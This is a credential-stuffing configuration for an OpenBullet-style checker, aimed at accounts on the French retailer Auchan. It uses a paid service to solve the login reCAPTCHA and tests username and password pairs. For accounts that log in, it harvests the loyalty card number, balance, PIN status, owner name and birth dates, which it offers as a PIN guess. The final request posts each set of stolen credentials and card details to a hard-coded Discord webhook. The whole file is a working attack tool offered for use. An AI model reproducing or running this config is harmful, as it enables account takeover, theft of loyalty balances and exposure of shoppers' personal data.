[SETTINGS]
{
  "Name": "Auchan Full Capture",
  "SuggestedBots": 1,
  "MaxCPM": 0,
  "LastModified": "2023-11-28T19:12:21.5937965+01:00",
  "AdditionalInfo": "",
  "Author": "★彡 TayKow  彡★",
  "Version": "1.4.5 [Anomaly]",
  "IgnoreResponseErrors": false,
  "MaxRedirects": 8,
  "NeedsProxies": false,
  "OnlySocks": false,
  "OnlySsl": false,
  "MaxProxyUses": 0,
  "BanProxyAfterGoodStatus": false,
  "EncodeData": false,
  "AllowedWordlist1": "",
  "AllowedWordlist2": "",
  "DataRules": [],
  "CustomInputs": [],
  "CaptchaUrl": "",
  "Base64": "",
  "Grayscale": false,
  "RemoveLines": false,
  "RemoveNoise": false,
  "Dilate": false,
  "Threshold": 1.0,
  "DiffKeep": 0.0,
  "DiffHide": 0.0,
  "Saturate": false,
  "Saturation": 0.0,
  "Transparent": false,
  "Contour": false,
  "OnlyShow": false,
  "ContrastGamma": false,
  "Contrast": 1.0,
  "Gamma": 1.0,
  "Brightness": 1.0,
  "RemoveLinesMin": 0,
  "RemoveLinesMax": 0,
  "ForceHeadless": false,
  "AlwaysOpen": false,
  "AlwaysQuit": false,
  "DisableNotifications": false,
  "CustomUserAgent": "",
  "RandomUA": false,
  "CustomCMDArgs": ""
}

[SCRIPT]
REQUEST POST "https://api.capsolver.com/createTask" 
  CONTENT "{\"clientKey\":\"<KEY>\",\"task\":{\"type\":\"ReCaptchaV3TaskProxyLess\", \"websiteURL\":\"https://compte.auchan.fr/\",\"websiteKey\":\"6LfU0V4mAAAAANrV2jfQRPkQbW8VoQkobV5Efw9b\",\"pageAction\":\"login\"}}" 
  CONTENTTYPE "application/json" 
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
  HEADER "Pragma: no-cache" 
  HEADER "Accept: */*" 

KEYCHECK 
  KEYCHAIN Success OR 
    KEY "errorId\":0" 
  KEYCHAIN Retry OR 
    KEY "<SOURCE>" DoesNotContain "errorId\":0" 

PARSE "<SOURCE>" LR "\":0,\"taskId\":\"" "\"" -> VAR "taskid" 

FUNCTION Delay "2000" 

REQUEST POST "https://api.capsolver.com/getTaskResult" 
  CONTENT "{\"clientKey\":\"<KEY>\",\"taskId\":\"<taskid>\"}" 
  CONTENTTYPE "application/json" 
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
  HEADER "Pragma: no-cache" 
  HEADER "Accept: */*" 

KEYCHECK 
  KEYCHAIN Success OR 
    KEY "03A" 
  KEYCHAIN Retry OR 
    KEY "<SOURCE>" DoesNotContain "03A" 

PARSE "<SOURCE>" LR "\":{\"gRecaptchaResponse\":\"" "\",\"userAgent\":\"" -> VAR "rresp" 

REQUEST GET "https://www.auchan.fr/client/accueil" 
  
  HEADER "Host: compte.auchan.fr" 
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0" 
  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
  HEADER "Accept-Encoding: gzip, deflate, br" 
  HEADER "DNT: 1" 
  HEADER "Connection: keep-alive" 
  HEADER "Upgrade-Insecure-Requests: 1" 
  HEADER "Sec-Fetch-Dest: document" 
  HEADER "Sec-Fetch-Mode: navigate" 
  HEADER "Sec-Fetch-Site: none" 
  HEADER "Sec-Fetch-User: ?1" 
  HEADER "TE: trailers" 

PARSE "<SOURCE>" LR "https://compte.auchan.fr/auth/realms/auchan.fr/login-actions/authenticate?session_code=" "&amp;execution" -> VAR "sessioncode" 

PARSE "<SOURCE>" LR "amp;execution=" "&amp;client_id" -> VAR "execution" 

PARSE "<SOURCE>" LR "amp;tab_id=" "\" method=\"post\"" -> VAR "tabid" 

REQUEST POST "https://compte.auchan.fr/auth/realms/auchan.fr/login-actions/authenticate?session_code=<sessioncode>&execution=<execution>&client_id=lark-crest&tab_id=<tabid>" 
  CONTENT "username=<USER>&password=<PASS>&g-recaptcha-response=<rresp>&rememberMe=on&credentialId=" 
  CONTENTTYPE "application/x-www-form-urlencoded" 
  HEADER "Host: compte.auchan.fr" 
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0" 
  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
  HEADER "Accept-Encoding: gzip, deflate, br" 
  HEADER "Origin: null" 
  HEADER "DNT: 1" 
  HEADER "Upgrade-Insecure-Requests: 1" 
  HEADER "Sec-Fetch-Dest: document" 
  HEADER "Sec-Fetch-Mode: navigate" 
  HEADER "Sec-Fetch-Site: same-origin" 
  HEADER "Sec-Fetch-User: ?1" 

KEYCHECK 
  KEYCHAIN Success OR 
    KEY "cardSelector__cardNumber\">N&#xB0; <strong>051" 
    KEY "cardSelector__cardNumber\">N&#xB0; <strong>049" 
    KEY "cardSelector__cardNumber\">N&#xB0; <strong>050" 
  KEYCHAIN Failure OR 
    KEY "Mot de passe invalide." 
    KEY "pas encore de carte de" 
    KEY "Nom d&#39;utilisateur ou mot de passe invalide" 
  KEYCHAIN Ban OR 
    KEY "429 Too Many Requests" 

REQUEST GET "https://www.auchan.fr/client/mes-informations/accueil" 
  
  HEADER "Host: www.auchan.fr" 
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0" 
  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8" 
  HEADER "Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3" 
  HEADER "Accept-Encoding: gzip, deflate, br" 
  HEADER "Referer: https://www.auchan.fr/client/accueil" 
  HEADER "DNT: 1" 
  HEADER "Upgrade-Insecure-Requests: 1" 
  HEADER "Sec-Fetch-Dest: document" 
  HEADER "Sec-Fetch-Mode: navigate" 
  HEADER "Sec-Fetch-Site: same-origin" 
  HEADER "Sec-Fetch-User: ?1" 
  HEADER "TE: trailers" 

#DOB PARSE "<SOURCE>" LR "editBox__label\">N&#xE9; le</div><div class=\"o-editBox__value\">" "</div></div></div><div class=\"o-editBox__actions\"><a class=\"o-editBox__editBtn\" href=\"/client/mes-informations/modifier-mon-profil" CreateEmpty=FALSE -> CAP "dob" 

#GET_Infos_Compte REQUEST GET "https://www.auchan.fr/auth/user-info" 
  
  HEADER "Host: www.auchan.fr" 
  HEADER "Connection: keep-alive" 
  HEADER "Accept: application/json, text/plain, */*" 
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36 Edg/85.0.564.51" 
  HEADER "Sec-Fetch-Site: same-origin" 
  HEADER "Sec-Fetch-Mode: cors" 
  HEADER "Sec-Fetch-Dest: empty" 
  HEADER "Referer: https://www.auchan.fr/courses" 
  HEADER "Accept-Encoding: gzip, deflate, br" 
  HEADER "Accept-Language: fr,fr-FR;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6" 

#Check_Login KEYCHECK BanOnToCheck=FALSE 
  KEYCHAIN Success OR 
    KEY "{\"authenticated\":true," 
  KEYCHAIN Failure OR 
    KEY "{\"authenticated\":false" 
  KEYCHAIN Retry AND 
    KEY "<SOURCE>" DoesNotContain "{\"authenticated\":true" 
    KEY "<SOURCE>" DoesNotContain "{\"authenticated\":false" 

REQUEST GET "https://www.auchan.fr/auth/silent-check-sso" AcceptEncoding=FALSE 
  
  HEADER "User-Agent: Auchan/11.12.13 (com.auchan.android ; Android 8.4 ; API 69)" 
  HEADER "Pragma: no-cache" 
  HEADER "Accept: */*" 

#token PARSE "<SOURCE>" LR "\"token\":\"" "\"" -> VAR "token" 

REQUEST GET "https://api.auchan.fr/customers/v1/loyalty/accounts" AcceptEncoding=FALSE AutoRedirect=FALSE 
  
  HEADER "Authorization: Bearer <token>" 
  HEADER "User-Agent: Auchan/11.12.13 (com.auchan.android ; Android 8.4 ; API 69)" 
  HEADER "X-Gravitee-Api-Key: 9d5baca2-6c2c-40d5-8584-52cfc242768b" 
  HEADER "Host: api.auchan.fr" 
  HEADER "Connection: Keep-Alive" 
  HEADER "Accept-Encoding: gzip, deflate" 

KEYCHECK BanOnToCheck=FALSE 
  KEYCHAIN Failure OR 
    KEY "<SOURCE>" EqualTo "[]" 
  KEYCHAIN Custom "FREE" AND 
    KEY "<SOURCE>" DoesNotContain "\"balance\":{\"amount\"" 
    KEY "<SOURCE>" NotEqualTo "[]" 

#fnd FUNCTION CountOccurrences "cardNumber" "<SOURCE>" -> VAR "fnd" 

IF "<fnd>" EqualTo "1"

#Nom PARSE "<SOURCE>" JSON "[0].owner.lastName" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "Nom" 

#Carte PARSE "<SOURCE>" JSON "[0].cardNumber" JTokenParsing=TRUE CreateEmpty=FALSE -> CAP "Carte" 

#pinRequired PARSE "<SOURCE>" JSON "[0].pinRequired" JTokenParsing=TRUE CreateEmpty=FALSE -> VAR "pinRequired" 

#PIN FUNCTION Translate StopAfterFirstMatch=FALSE 
  KEY "True" VALUE "Avec" 
  KEY "False" VALUE "Sans" 
  KEY "true" VALUE "Avec" 
  KEY "false" VALUE "Sans" 
  "<pinRequired>" -> CAP "PIN" 

#locked PARSE "<SOURCE>" JSON "[0].locked" JTokenParsing=TRUE CreateEmpty=FALSE -> VAR "locked" 

#Etat FUNCTION Translate StopAfterFirstMatch=FALSE 
  KEY "True" VALUE "Bloquée" 
  KEY "False" VALUE "Active" 
  KEY "true" VALUE "Bloquée" 
  KEY "false" VALUE "Active" 
  "<locked>" -> CAP "Etat" 

#amount PARSE "<SOURCE>" JSON "[0].balance.amount" JTokenParsing=TRUE CreateEmpty=FALSE -> VAR "amount" 

#Solde FUNCTION Compute "<amount>/100" -> CAP "Solde" 

KEYCHECK BanOnToCheck=FALSE 
  KEYCHAIN Custom "FREE" OR 
    KEY "<Solde>" LessThan "20" 
    KEY "<Etat>" EqualTo "Bloquée" 

ELSE

#Noms PARSE "<SOURCE>" JSON "lastName" Recursive=TRUE -> VAR "Noms" 

#Carte PARSE "<SOURCE>" JSON "cardNumber" Recursive=TRUE -> VAR "Carte" 

#pinRequired PARSE "<SOURCE>" JSON "pinRequired" Recursive=TRUE CreateEmpty=FALSE -> VAR "pinRequired" 

#PIN FUNCTION Translate StopAfterFirstMatch=FALSE 
  KEY "True" VALUE "Avec" 
  KEY "False" VALUE "Sans" 
  KEY "true" VALUE "Avec" 
  KEY "false" VALUE "Sans" 
  "<pinRequired[*]>" -> VAR "PIN" 

#locked PARSE "<SOURCE>" JSON "locked" Recursive=TRUE CreateEmpty=FALSE -> VAR "locked" 

#Etat FUNCTION Translate StopAfterFirstMatch=FALSE 
  KEY "True" VALUE "Bloquée" 
  KEY "False" VALUE "Active" 
  KEY "true" VALUE "Bloquée" 
  KEY "false" VALUE "Active" 
  "<locked[*]>" -> VAR "Etat" 

#amount PARSE "<SOURCE>" JSON "amount" Recursive=TRUE CreateEmpty=FALSE -> VAR "amount" 

#Solde FUNCTION Compute "<amount[*]>/100" -> VAR "Solde" 

#Cartes FUNCTION Constant "Nom: <Noms[*]> | Carte = <Carte[*]> (PIN = <PIN[*]> | Etat = <Etat[*]> | Solde = <Solde[*]>)" -> CAP "Cartes" 

#compute FUNCTION Translate StopAfterFirstMatch=FALSE 
  KEY ", " VALUE "+" 
  KEY "[" VALUE "" 
  KEY "]" VALUE "" 
  "<Solde>" -> VAR "compute" 

#compute FUNCTION Compute "<compute>" -> VAR "compute" 

KEYCHECK BanOnToCheck=FALSE 
  KEYCHAIN Custom "FREE" AND 
    KEY "<SOURCE>" DoesNotContain "locked\":false" 
  KEYCHAIN Custom "FREE" OR 
    KEY "<compute>" LessThan "20" 

ENDIF

REQUEST GET "https://www.auchan.fr/client/mes-informations/accueil" AcceptEncoding=FALSE AutoRedirect=FALSE 
  
  HEADER "Authorization: Bearer <token>" 
  HEADER "User-Agent: Auchan/11.12.13 (com.auchan.android ; Android 8.4 ; API 69)" 
  HEADER "X-Gravitee-Api-Key: 9d5baca2-6c2c-40d5-8584-52cfc242768b" 
  HEADER "Host: api.auchan.fr" 
  HEADER "Connection: Keep-Alive" 
  HEADER "Accept-Encoding: gzip, deflate" 

#1 PARSE "<SOURCE>" LR "</span></div><div class=\"o-editBox__value\">" "<" CreateEmpty=FALSE -> VAR "1" 

#Date_de_naissance FUNCTION Translate StopAfterFirstMatch=FALSE 
  KEY "January" VALUE "01" 
  KEY "February" VALUE "02" 
  KEY "March" VALUE "03" 
  KEY "April" VALUE "04" 
  KEY "May" VALUE "05" 
  KEY "June" VALUE "06" 
  KEY "July" VALUE "07" 
  KEY "August" VALUE "08" 
  KEY "September" VALUE "09" 
  KEY "October" VALUE "10" 
  KEY "November" VALUE "11" 
  KEY "December" VALUE "12" 
  KEY " " VALUE "/" 
  "<1>" -> CAP "Date de naissance" 

#2 PARSE "<SOURCE>" LR "</div></div><div class=\"o-editBox__line\"><div class=\"o-editBox__value\">" "<" Recursive=TRUE -> VAR "2" 

#Date_de_naissance_famille FUNCTION Translate StopAfterFirstMatch=FALSE 
  KEY "n&#xE9;/" VALUE "" 
  KEY "nÃ©e le " VALUE "" 
  KEY "nÃ© le " VALUE "" 
  KEY "January" VALUE "01" 
  KEY "February" VALUE "02" 
  KEY "March" VALUE "03" 
  KEY "April" VALUE "04" 
  KEY "May" VALUE "05" 
  KEY "June" VALUE "06" 
  KEY "July" VALUE "07" 
  KEY "August" VALUE "08" 
  KEY "September" VALUE "09" 
  KEY "October" VALUE "10" 
  KEY "November" VALUE "11" 
  KEY "December" VALUE "12" 
  KEY " " VALUE "/" 
  "<2>" -> VAR "Date de naissance famille" 

#Date_de_naissance_famille FUNCTION Translate StopAfterFirstMatch=FALSE 
  KEY ",/" VALUE ", " 
  "<Date de naissance famille>" -> CAP "Date de naissance famille" 

REQUEST POST "https://discord.com/api/webhooks/1162735771153862717/Rbk1r12nt9S2IqN9IeI0gx4K5_v8XM6ZQjVj8j-pXp22QWy93rs7APUB0MjsINUVq0W1" 
  CONTENT "{\"content\":\"<USER>:<PASS> | N° Carte = <Carte> | Solde = <Solde>€ | PIN SUGGESTION = <Date de naissance>\"}" 
  CONTENTTYPE "application/json" 
  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
  HEADER "Pragma: no-cache" 
  HEADER "Accept: */*" 

